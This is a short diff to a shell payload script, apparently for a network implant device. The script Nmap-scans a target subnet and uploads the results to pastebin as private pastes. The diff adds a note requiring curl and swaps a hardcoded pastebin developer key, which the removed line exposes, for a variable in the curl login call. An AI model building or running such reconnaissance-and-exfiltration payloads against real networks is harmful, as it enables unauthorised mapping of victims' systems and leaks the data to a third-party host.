@@ -6,6 +6,7 @@
 #
 # Scans target subnet with Nmap using specified options. Saves each scan result
 # to loot storage folder and then uploads it to pastebin as a private paste.
+#This payload requires you to install curl via opkg
 #
 # Red ...........Setup
 # Amber..........Scanning
@@ -96,7 +97,7 @@ function pastebin () {
 
 function login(){
 	#Login to pastebin and get a login key
-     	LOGIN_KEY=$(echo | curl -d @- -d 'api_dev_key=21ecdb136aab5344c0a623d0e168cb74' -d 'api_user_name='"$API_USER"'' -d 'api_user_password='"$API_PASSWORD"'' 'https://pastebin.com/api/api_login.php')
+     	LOGIN_KEY=$(echo | curl -d @- -d 'api_dev_key='"$API_KEY"'' -d 'api_user_name='"$API_USER"'' -d 'api_user_password='"$API_PASSWORD"'' 'https://pastebin.com/api/api_login.php')
 }
 
 # Run payload
